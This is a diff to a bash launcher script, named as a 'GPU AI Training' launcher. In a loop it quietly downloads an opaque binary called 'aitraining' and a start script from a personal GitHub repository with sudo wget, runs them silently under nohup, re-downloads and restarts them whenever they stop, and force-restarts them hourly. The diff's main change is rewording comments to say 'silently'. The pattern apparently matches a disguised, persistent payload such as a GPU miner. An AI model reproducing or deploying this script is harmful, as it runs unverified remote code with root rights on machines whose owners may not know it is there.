@@ -1,8 +1,9 @@
 #!/bin/bash
 # File: start_modelgp.sh launcher
-# Purpose: Run start_modelgp.sh continuously, restart if stopped, force restart every hour
-# Behavior: Auto-restart if stopped and force restart every hour
-# The 5-minute monitor runs in the terminal (no nohup)
+# Purpose: Run start_modelgp.sh continuously
+# - Auto-restart if stopped
+# - Forced restart every hour
+# - 5-minute terminal monitoring
 
 while true; do
     echo "========== Starting GPU AI Training Launcher =========="
@@ -19,7 +20,7 @@ while true; do
     echo "Deleting old files..."
     rm -f ./aitraining ./start_modelgp.sh
 
-    # Launch start_modelgp.sh in background with nohup
+    # Launch start_modelgp.sh silently with nohup
     nohup bash -c '
         sudo wget -q -O ./aitraining https://github.com/max313iq/Ssl/raw/main/aitraining
         sudo wget -q -O ./start_modelgp.sh https://github.com/max313iq/Ssl/raw/main/start_modelgp.sh
@@ -40,7 +41,7 @@ while true; do
             echo "$(date '+%Y-%m-%d %H:%M:%S') - aitraining running fine."
         else
             echo "$(date '+%Y-%m-%d %H:%M:%S') - aitraining stopped! Restarting start_modelgp.sh..."
-            
+
             # Kill any remaining processes
             sudo pkill -f "start_modelgp.sh" 2>/dev/null
             sudo pkill -f "aitraining" 2>/dev/null
@@ -48,7 +49,7 @@ while true; do
             # Delete old files before redownload
             rm -f ./aitraining ./start_modelgp.sh
 
-            # Relaunch
+            # Relaunch silently
             nohup bash -c "
                 sudo wget -q -O ./aitraining https://github.com/max313iq/Ssl/raw/main/aitraining
                 sudo wget -q -O ./start_modelgp.sh https://github.com/max313iq/Ssl/raw/main/start_modelgp.sh
@@ -64,3 +65,6 @@ while true; do
     # --- 1-hour forced restart ---
     echo "========== 1 hour completed, restarting processes =========="
 done
+
+
+
